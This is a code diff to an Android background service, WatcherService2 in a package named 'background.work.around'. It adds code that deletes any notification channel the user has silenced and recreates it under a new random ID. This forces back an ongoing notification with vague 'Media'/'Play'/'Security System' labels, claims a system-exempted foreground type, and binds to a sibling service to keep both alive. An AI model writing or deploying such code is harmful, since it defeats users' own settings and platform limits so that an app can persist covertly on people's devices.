@@ -1,19 +1,56 @@
 package background.work.around;
 
-import android.app.Service;
-import android.content.ComponentName;
-import android.content.Context;
-import android.content.Intent;
-import android.content.ServiceConnection;
-import android.media.MediaPlayer;
-import android.os.Binder;
-import android.os.IBinder;
-import android.provider.Settings;
+
+import java.util.*;
+import android.app.*;
+import android.content.*;
+import android.content.pm.*;
+import android.media.*;
+import android.os.*;
+import android.provider.*;
 
 public class WatcherService2 extends Service {
     private MediaPlayer player;
     private boolean isRunning = false;
 
+    private void startEnforcedService() {
+	Context context = this;
+    NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+    String pkg = context.getPackageName();
+
+    List<NotificationChannel> channels = nm.getNotificationChannels();
+    String activeId = null;
+    boolean needNew = false;
+
+    for (NotificationChannel ch : channels) {
+        if (ch.getImportance() == NotificationManager.IMPORTANCE_NONE) {
+            nm.deleteNotificationChannel(ch.getId());
+            needNew = true;
+        } else if (activeId == null) {
+            activeId = ch.getId();
+        }
+    }
+
+    if (needNew || activeId == null) {
+        activeId = "background.work.around" + Long.toHexString(new java.security.SecureRandom().nextLong());
+        NotificationChannel nch = new NotificationChannel(activeId, "Security System", NotificationManager.IMPORTANCE_DEFAULT);
+        nm.createNotificationChannel(nch);
+    }
+
+    Notification notif = new Notification.Builder(context, activeId)
+            .setContentTitle("Media")
+            .setContentText("Play")
+            .setSmallIcon(android.R.drawable.ic_lock_lock)
+            .setOngoing(true)
+            .build();
+
+    if (android.os.Build.VERSION.SDK_INT >= 34) {
+        startForeground(1, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_SYSTEM_EXEMPTED);
+    } else {
+        startForeground(1, notif);
+    }
+	}
+    
     private void bindToNeighbor() {
     Intent intent = new Intent(this, WatcherService.class);
     bindService(intent, connection, Context.BIND_AUTO_CREATE | Context.BIND_IMPORTANT | Context.BIND_ABOVE_CLIENT);
@@ -51,6 +88,7 @@ public class WatcherService2 extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
     if (!isRunning) {
         isRunning = true;
+        startEnforcedService();
         bindToNeighbor();
         }
     if (player == null) {
